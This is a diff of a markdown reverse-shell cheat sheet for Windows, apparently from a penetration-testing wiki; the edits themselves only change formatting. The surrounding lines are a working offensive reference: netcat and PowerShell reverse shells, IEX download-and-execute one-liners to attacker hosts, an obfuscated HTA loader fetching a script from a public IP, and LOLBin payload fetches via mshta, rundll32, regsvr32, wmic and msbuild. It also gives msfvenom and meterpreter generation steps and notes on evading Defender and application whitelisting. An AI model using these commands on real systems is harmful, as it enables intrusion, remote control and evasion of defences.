@@ -1,7 +1,7 @@
 # Shells - Windows
 
-The page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) for linux.  
-Obviously **there isn't SUID files or sudo privileges in Windows**, but it's useful to know **how** some **binaries** can be \(ab\)used perform some kind of unexpected actions like **execute arbitrary code.**
+The page [lolbas-project.github.io](https://lolbas-project.github.io) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io) for linux.\
+Obviously **there isn't SUID files or sudo privileges in Windows**, but it's useful to know **how** some **binaries** can be (ab)used perform some kind of unexpected actions like **execute arbitrary code.**
 
 ## NC
 
@@ -11,7 +11,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 
 ## SBD
 
-**sbd** is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption \(by Christophe Devine\), program execution \(-e option\), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. sbd.exe \(part of the Kali linux distribution: /usr/share/windows-resources/sbd/sbd.exe\) can be uploaded to a Windows box as a Netcat alternative.
+**sbd** is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. sbd.exe (part of the Kali linux distribution: /usr/share/windows-resources/sbd/sbd.exe) can be uploaded to a Windows box as a Netcat alternative.
 
 ## Python
 
@@ -42,7 +42,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 
 ## OpenSSH
 
-Attacker \(Kali\)
+Attacker (Kali)
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
@@ -69,14 +69,14 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 
-Process performing network call: **powershell.exe**  
-Payload written on disk: **NO** \(_at least nowhere I could find using procmon !_\)
+Process performing network call: **powershell.exe**\
+Payload written on disk: **NO** (_at least nowhere I could find using procmon !_)
 
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 
-Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**\
 Payload written on disk: **WebDAV client local cache**
 
 **One liner:**
@@ -93,24 +93,24 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
 
-Process performing network call: **mshta.exe**  
+Process performing network call: **mshta.exe**\
 Payload written on disk: **IE local cache**
 
 ```bash
 mshta http://webserver/payload.hta
 ```
 
-Process performing network call: **mshta.exe**  
+Process performing network call: **mshta.exe**\
 Payload written on disk: **IE local cache**
 
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
 
-Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**\
 Payload written on disk: **WebDAV client local cache**
 
-#### **Example of hta-psh reverse shell \(use hta to download and execute PS backdoor\)**
+#### **Example of hta-psh reverse shell (use hta to download and execute PS backdoor)**
 
 ```markup
  <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
@@ -180,14 +180,14 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
 
-Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**\
 Payload written on disk: **WebDAV client local cache**
 
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
 
-Process performing network call: **rundll32.exe**  
+Process performing network call: **rundll32.exe**\
 Payload written on disk: **IE local cache**
 
 **Detected by defender**
@@ -236,14 +236,14 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 
-Process performing network call: **regsvr32.exe**  
+Process performing network call: **regsvr32.exe**\
 Payload written on disk: **IE local cache**
 
-```text
+```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
 
-Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**\
 Payload written on disk: **WebDAV client local cache**
 
 **Detected by defender**
@@ -318,7 +318,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 \\webdavserver\folder\batchfile.bat
 ```
 
-Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**\
 Payload written on disk: **WebDAV client local cache**
 
 ```bash
@@ -336,14 +336,14 @@ impacket-smbserver -smb2support kali `pwd`
 
 Attacker
 
-```text
+```
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
 python -m SimpleHTTPServer 80
 ```
 
 Victim:
 
-```text
+```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
 
@@ -351,16 +351,16 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 
 ## **Wmic**
 
-```text
+```
 wmic os get /format:"https://webserver/payload.xsl"
 ```
 
-Process performing network call: **wmic.exe**  
+Process performing network call: **wmic.exe**\
 Payload written on disk: **IE local cache**
 
 Example xsl file:
 
-```text
+```
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
 <output method="text"/>
@@ -380,17 +380,17 @@ Extracted from [here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd07
 
 ## Msbuild
 
-```text
+```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
 
-Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**\
 Payload written on disk: **WebDAV client local cache**
 
-You can use this technique to bypass Application Whitelisting and Powershell.exe restrictions. As you will be prompted with a PS shell.  
+You can use this technique to bypass Application Whitelisting and Powershell.exe restrictions. As you will be prompted with a PS shell.\
 Just download this and execute it: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 
-```text
+```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
 
@@ -398,23 +398,23 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Compile C\# code in the victim machine.
+Compile C# code in the victim machine.
 
-```text
+```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
 
-You can download a basic C\# reverse shell from here: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+You can download a basic C# reverse shell from here: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Not deteted**
 
 ## **Regasm/Regsvc**
 
-```text
+```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
 
-Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**\
 Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
@@ -423,11 +423,11 @@ Payload written on disk: **WebDAV client local cache**
 
 ## Odbcconf
 
-```text
+```
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 
-Process performing network call: **svchost.exe**  
+Process performing network call: **svchost.exe**\
 Payload written on disk: **WebDAV client local cache**
 
 **I haven't tried it**
@@ -442,17 +442,17 @@ Payload written on disk: **WebDAV client local cache**
 
 In the **Shells** folder there are a lot of different shells. To download and execute Invoke-_PowerShellTcp.ps1_ make a copy of the script, append to the end of the file:
 
-```text
+```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
 
 Start serving the script in a web server and execute in the victim:
 
-```text
+```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 
-Defender doesn't detect it as malicious code \(yet, 3/04/2019\).
+Defender doesn't detect it as malicious code (yet, 3/04/2019).
 
 **TODO: Check other nishang shells**
 
@@ -462,17 +462,17 @@ Defender doesn't detect it as malicious code \(yet, 3/04/2019\).
 
 Download, start web server, star listener and execute in victim:
 
-```text
+```
  powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
 
-Defender doesn't detect it as malicious code \(yet, 3/04/2019\).
+Defender doesn't detect it as malicious code (yet, 3/04/2019).
 
 **Other options offered by powercat:**
 
-Bind shells, Reverse shell \(TCP, UDP, DNS\), Port redirect, upload/download, Generate payloads, Serve files...
+Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 
-```text
+```
 Serve a cmd Shell:
     powercat -l -p 443 -e cmd
 Send a cmd Shell:
@@ -495,7 +495,7 @@ Start A Persistent Server That Serves a File:
 
 Create a powershell launcher, save it in a file and download and execute it.
 
-```text
+```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
 
@@ -507,19 +507,19 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 Create a powershell version of metasploit backdoor using unicorn
 
-```text
+```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
 
 Start msfconsole with the created resource:
 
-```text
+```
 msfconsole -r unicorn.rc
 ```
 
 Start a web server serving the _powershell\_attack.txt_ file and execute in the victim:
 
-```text
+```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
 
@@ -527,21 +527,20 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## More
 
-[PS&gt;Attack](https://github.com/jaredhaight/PSAttack) PS console with some offensive PS modules preloaded \(cyphered\)  
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[  
-WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive PS modules and proxy detection \(IEX\)
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console with some offensive PS modules preloaded (cyphered)\
+[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
+WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive PS modules and proxy detection (IEX)
 
 ## Bibliography
 
-{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" caption="" %}
+{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}
 
-{% embed url="https://gist.github.com/Arno0x" caption="" %}
+{% embed url="https://gist.github.com/Arno0x" %}
 
-{% embed url="https://github.com/GreatSCT/GreatSCT" caption="" %}
+{% embed url="https://github.com/GreatSCT/GreatSCT" %}
 
-{% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" caption="" %}
+{% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" %}
 
-{% embed url="https://www.hackingarticles.in/koadic-com-command-control-framework/" caption="" %}
+{% embed url="https://www.hackingarticles.in/koadic-com-command-control-framework/" %}
 
-{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" caption="" %}
-
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
